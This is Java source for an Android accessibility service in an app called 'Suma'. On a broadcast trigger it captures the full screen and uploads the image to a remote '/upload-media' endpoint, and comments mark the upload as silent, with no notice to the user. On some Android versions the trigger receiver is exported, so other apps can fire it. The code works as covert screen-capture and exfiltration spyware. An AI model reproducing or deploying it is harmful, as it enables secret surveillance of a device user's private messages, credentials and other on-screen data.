package com.example.suma;

import android.accessibilityservice.AccessibilityService;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Bitmap;
import android.os.Build;
import android.util.Log;
import android.view.Display;
import android.view.accessibility.AccessibilityEvent;
import android.widget.Toast;
import android.os.Handler;
import android.os.Looper;

import androidx.annotation.NonNull;

import java.io.File;
import java.io.FileOutputStream;
import java.util.concurrent.Executor;

public class GlobalActionService extends AccessibilityService {

    private static final String TAG = "SumaAccessibility";
    public static final String ACTION_SCREENSHOT = "com.example.suma.ACTION_SCREENSHOT";

    private BroadcastReceiver screenshotReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (ACTION_SCREENSHOT.equals(intent.getAction())) {
                Log.d(TAG, "Received screenshot request via Broadcast");
                performGlobalScreenshot();
            }
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "GlobalActionService CREATE");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "GlobalActionService COMPONENT CONNECTED");

        try {
            IntentFilter filter = new IntentFilter(ACTION_SCREENSHOT);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                // Secure default: NOT_EXPORTED
                registerReceiver(screenshotReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                registerReceiver(screenshotReceiver, filter, Context.RECEIVER_EXPORTED);
            } else {
                registerReceiver(screenshotReceiver, filter);
            }
            Log.d(TAG, "Receiver Registered Successfully");
        } catch (Exception e) {
            Log.e(TAG, "Failed to register receiver: " + e.getMessage());
            e.printStackTrace();
        }
    }

    @Override
    public boolean onUnbind(Intent intent) {
        try {
            unregisterReceiver(screenshotReceiver);
        } catch (Exception e) {
            // Receiver might not be registered
        }
        return super.onUnbind(intent);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Not used, but required to override
    }

    @Override
    public void onInterrupt() {
        // Not used
    }

    private void performGlobalScreenshot() {
        if (Build.VERSION.SDK_INT >= 30) {
            takeScreenshot(Display.DEFAULT_DISPLAY, new Executor() {
                @Override
                public void execute(Runnable command) {
                    command.run();
                }
            }, new TakeScreenshotCallback() {
                @Override
                public void onSuccess(@NonNull ScreenshotResult screenshotResult) {
                    Log.d(TAG, "Screenshot Taken Successfully");
                    Bitmap bitmap = Bitmap.wrapHardwareBuffer(screenshotResult.getHardwareBuffer(),
                            screenshotResult.getColorSpace());
                    if (bitmap != null) {
                        // We need a copy because HardwareBuffer might be closed
                        Bitmap copy = bitmap.copy(Bitmap.Config.ARGB_8888, false);
                        bitmap.recycle();
                        screenshotResult.getHardwareBuffer().close();
                        saveAndUpload(copy);
                    }
                }

                @Override
                public void onFailure(@NonNull int errorCode) {
                    Log.e(TAG, "Screenshot Failed: " + errorCode);
                }
            });
        } else {
            // Fallback for Global Action (Take Screenshot) - API 28+
            performGlobalAction(GLOBAL_ACTION_TAKE_SCREENSHOT);
        }
    }

    private void saveAndUpload(Bitmap bitmap) {
        try {
            File file = new File(getCacheDir(), "screenshot_" + System.currentTimeMillis() + ".png");
            FileOutputStream fos = new FileOutputStream(file);
            bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
            fos.flush();
            fos.close();

            Log.d(TAG, "Screenshot saved to: " + file.getAbsolutePath());

            // Use AuthManager to get the correct token and URL
            String authToken = AuthManager.getToken(this);
            String baseUrl = AuthManager.getBaseUrl();

            if (authToken != null) {
                NetworkUtils.uploadFile(baseUrl + "/upload-media", file, authToken,
                        new NetworkUtils.Callback() {
                            @Override
                            public void onSuccess(String response) {
                                Log.d(TAG, "Upload Success: " + response);
                                file.delete();
                                // Silent: No Toast
                            }

                            @Override
                            public void onError(String error) {
                                Log.e(TAG, "Upload Failed: " + error);
                                // Silent: No Toast
                            }
                        });
            } else {
                Log.e(TAG, "Auth Token is null, cannot upload.");
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
